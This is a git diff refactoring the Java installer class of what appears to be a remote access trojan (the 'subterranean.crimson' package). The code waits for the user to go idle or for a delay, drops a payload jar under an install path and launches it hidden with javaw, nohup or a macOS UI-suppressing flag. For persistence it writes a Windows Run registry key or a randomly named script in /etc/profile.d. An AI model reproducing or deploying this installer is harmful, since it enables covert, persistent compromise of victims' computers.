@@ -21,28 +21,23 @@ import java.awt.MouseInfo;
 import java.io.File;
 import java.io.FileNotFoundException;
 import java.io.IOException;
-import java.io.InputStream;
 import java.io.PrintWriter;
+import java.nio.file.Path;
+import java.nio.file.Paths;
 import java.util.ArrayList;
 import java.util.Date;
+import java.util.HashMap;
 import java.util.Random;
-import java.util.Scanner;
 
 import subterranean.crimson.permajar.stage1.Stage1;
 import subterranean.crimson.universal.FileLocking;
 import subterranean.crimson.universal.GenerationUtils;
-import subterranean.crimson.universal.Path;
+import subterranean.crimson.universal.ObjectTransfer;
 import subterranean.crimson.universal.Platform;
 import subterranean.crimson.universal.Utilities;
 import subterranean.crimson.universal.Version;
-import subterranean.crimson.universal.classreference.ClassReference;
-import subterranean.crimson.universal.containers.InstallationDetails;
 import subterranean.crimson.universal.containers.Options;
 import subterranean.crimson.universal.containers.SystemMessage;
-import subterranean.crimson.universal.exceptions.InvalidObjectException;
-import subterranean.crimson.universal.objects.ObjectTransfer;
-
-
 
 /**
  * 
@@ -52,75 +47,69 @@ import subterranean.crimson.universal.objects.ObjectTransfer;
 public class Client {
 
 	private static Path Ipath;
-	private static Options options;
-	private static ArrayList<File> cleanup = new ArrayList<File>();
+	private static final Options options = Stage1.loadOptions();
+	private static HashMap<String, Object> details = new HashMap<String, Object>();
 
 	public static void main(String[] args) {
 
 		// check for lock files
-		System.out.println(("boot-lock_file"));
 		if (FileLocking.lockExists()) {
 			// get out of here
-			System.out.println(("boot_error-lock_file"));
+			System.out.println(("Error: File lock exists"));
 			return;
 		}
 
-		for (int i = 0; i < args.length; i++) {
-			// delete any files that may be passed as arguments
-			Utilities.delete(new File(args[i]));
-		}
-
-		loadOptions();
-		options.details = new InstallationDetails();
-
 		if (options.waitForIDLE) {
 			// wait for idle
-			System.out.println(("boot-idle_wait"));
+			System.out.println(("Waiting..."));
 			idle();
 
 		} else {
 			// use delay
 			try {
 				long delay = options.executionDelay;
-				System.out.println(("boot-delay"));
-
+				System.out.println("Delaying for: " + delay + " milliseconds");
 				Thread.sleep(delay);
 			} catch (NumberFormatException e) {
 
 			} catch (InterruptedException e) {
 				// interrupted during the delay, quit
-				System.out.println(("Error: Installation delay was interrupted"));
+				System.out.println("Error: Installation delay was interrupted");
 				return;
 			}
 
 		}
 
-		System.out.println(("boot-installing"));
+		System.out.println(("Installing..."));
 
 		// document the installation time
-		options.details.installDate = new Date();
+		details.put("install_time", new Date());
 
 		// load path based on platform
-		if (Platform.windows) {
-			Ipath = options.windows;
-		} else if (Platform.linux) {
-			Ipath = options.linux;
-		} else {
+		switch (Platform.os) {
+		case DARWIN:
 			Ipath = options.osx;
+			break;
+		case WINDOWS:
+			Ipath = options.windows;
+			break;
+		default:
+			Ipath = options.linux;
+			break;
+
 		}
 
 		// replace all %USERNAME% with the actual username
-		Ipath.replace("%USERNAME%", System.getProperty("user.name"));
+		Ipath = Paths.get(Ipath.toString().replace("%USERNAME%", System.getProperty("user.name")));
 
 		// make sure the directory exists
-		File test = new File(Ipath.getParentPath());
+		File test = Ipath.toFile().getParentFile();
 		if (!test.exists()) {
 			test.mkdirs();
 		}
 
 		// create a temp file to write classes
-		File root = new File(Platform.tempDir + "cr_" + new Date().getTime());
-		cleanup.add(root);
+		File root = new File(Platform.tempDir.getAbsolutePath() + "/crimson_" + new Date().getTime());
 		if (!tryWrite_classes(root)) {
 			// failed
 			System.out.println(("Error: temporary directory is not writable"));
@@ -129,7 +118,7 @@ public class Client {
 		// all classes have been written to the temp dir and are ready to be copied to the
 		// target
 
-		File target = new File(Ipath.getAbsolutePath());
+		File target = Ipath.toFile();
 		if (target.exists()) {
 			// we have a collision
 			if (options.handleErrors) {
@@ -137,7 +126,7 @@ public class Client {
 				findWrite_jar();
 			} else {
 				// dont try again
-				cleanUp(root);
+				Stage1.delete(root);
 				return;
 			}
 		} else {
@@ -152,28 +141,28 @@ public class Client {
 
 				} else {
 					// dont try again
-					cleanUp(root);
+					Stage1.delete(root);
 					return;
 
 				}
 			}
 
 		}
-		cleanUp(root);
+		Stage1.delete(root);
 
 		// get bootstrap jar path
 		File path = new File(Client.class.getProtectionDomain().getCodeSource().getLocation().getPath());
 
 		// autostart
-
-		if (Platform.windows) {
+		switch (Platform.os) {
+		case WINDOWS:
 			switch (options.win_autostart_method) {
 			case None: {
 
 				break;
 			}
 			case Registry: {
-				String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"" + Ipath.getName() + "\" /d \"\"" + Ipath.getAbsolutePath() + "\"\" /t REG_SZ";
+				String command = "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v \"" + Ipath.getFileName() + "\" /d \"\"" + Ipath.toString() + "\"\" /t REG_SZ";
 				try {
 
 					if (Runtime.getRuntime().exec(command).waitFor() != 0) {
@@ -189,18 +178,17 @@ public class Client {
 					sm.message = ("The autostart module failed to write a registry key.");
 					sm.subject = ("Failed to create startup key");
 					sm.urgency = 1;
-					options.details.sms.add(sm);
+					details.put("sm", sm);
 				}
 				break;
 			}
 			}
-
-		} else {
-			// TODO
+			break;
+		default:
 			File startScript = new File("/etc/profile.d/" + Utilities.nameGen(5) + ".sh");
 			try {
 				PrintWriter pw = new PrintWriter(startScript);
-				pw.println("java -jar " + Ipath.getAbsolutePath() + "  </dev/null &>/dev/null &");
+				pw.println("java -jar " + Ipath.toString() + "  </dev/null &>/dev/null &");
 				pw.println("disown");
 
 				pw.close();
@@ -208,6 +196,7 @@ public class Client {
 			} catch (FileNotFoundException e) {
 
 			}
+			break;
 
 		}
 
@@ -215,13 +204,17 @@ public class Client {
 		try {
 
 			if (Version.release) {
-				if (Platform.osx) {
-					Runtime.getRuntime().exec("nohup java -Dapple.awt.UIElement=\"true\" -jar " + Ipath.getAbsolutePath() + " " + path.toString());
-				} else if (Platform.windows) {
-					Runtime.getRuntime().exec("javaw -jar " + Ipath.getAbsolutePath() + " " + path.toString());
+				switch (Platform.os) {
+				case DARWIN:
+					Runtime.getRuntime().exec("nohup java -Dapple.awt.UIElement=\"true\" -jar " + Ipath.toString() + " " + path.toString());
+					break;
+				case WINDOWS:
+					Runtime.getRuntime().exec("javaw -jar " + Ipath.toString() + " " + path.toString());
+					break;
+				default:
+					Runtime.getRuntime().exec("nohup java -jar " + Ipath.toString() + " " + path.toString());
+					break;
 
-				} else {
-					Runtime.getRuntime().exec("nohup java -jar " + Ipath.getAbsolutePath() + " " + path.toString());
 				}
 
 			} else {
@@ -262,7 +255,7 @@ public class Client {
 
 				if (segments > 10) {// ten consecutive segments went without interaction
 					// system is idle, return
-					options.details.waitedIDLEfor = (int) ((new Date().getTime() - begin) / 1000);
+					details.put("idle_time", (int) ((new Date().getTime() - begin) / 1000));
 					return;
 
 				}
@@ -275,10 +268,6 @@ public class Client {
 		}
 	}
 
-	public static void cleanUp(File root) {
-		Utilities.delete(root);
-	}
-
 	public static boolean tryWrite_jar(File path, File root) {
 		// now create jar from temp files
 		try {
@@ -288,7 +277,7 @@ public class Client {
 			}
 
 		} catch (Exception e) {
-			cleanUp(path);
+			Stage1.delete(path);
 			return false;
 		}
 
@@ -324,12 +313,17 @@ public class Client {
 	public static void findWrite_jar() {
 		// find a place to write no matter what
 		File root = null;
-		if (Platform.windows) {
+		switch (Platform.os) {
+		case WINDOWS:
 			root = new File("C:/");
-		} else {
+			break;
+		default:
 			root = new File("/");
+			break;
+
 		}
-		File target = new File(Ipath.getName());
+
+		File target = Ipath.toFile();
 		if (target.exists()) {
 			target = new File(Utilities.nameGen(6) + ".jar");
 		}
@@ -350,34 +344,9 @@ public class Client {
 
 		System.out.println("Wrote successfully to a random file. Updating options file");
 
-		options.details.details.put("modified_payload_name", target.getName());
-		options.details.details.put("modified_install_path", target.getParentFile().getAbsolutePath());
+		details.put("modified_payload_name", target.getName());
+		details.put("modified_install_path", target.getParentFile().getAbsolutePath());
 
-	}
-
-	public static void loadOptions() {
-
-		InputStream in = Stage1.class.getResourceAsStream("/subterranean/crimson/options");
-		if (in == null) {
-			// the options file was not found
-			System.out.println("FATAL: Could not find options");
-			return;
-		}
-		Scanner s = new Scanner(in);
-		if (!s.hasNextLine()) {
-			// empty options file
-			// error
-		} else {
-			try {
-				options = (Options) ObjectTransfer.fromString(s.nextLine(), true);
-
-			} catch (InvalidObjectException e) {
-				// TODO Auto-generated catch block
-				e.printStackTrace();
-			}
-
-		}
-		s.close();
 	}
 
 }
